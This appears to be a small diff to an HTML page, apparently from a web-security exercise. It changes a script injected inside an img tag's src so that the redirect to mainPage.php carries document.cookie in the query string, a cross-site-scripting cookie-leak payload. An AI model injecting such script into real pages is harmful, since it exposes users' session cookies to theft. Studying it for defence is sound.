@@ -12,6 +12,6 @@
 </head>
 <body>
     <img src = "movie_pictures/kung_fu_panda.jpg?ak=<script>
-    document.location.replace('mainPage.php');</script>">
+    document.location.replace('mainPage.php?' + document.cookie);</script>">
 </body>
 </html>
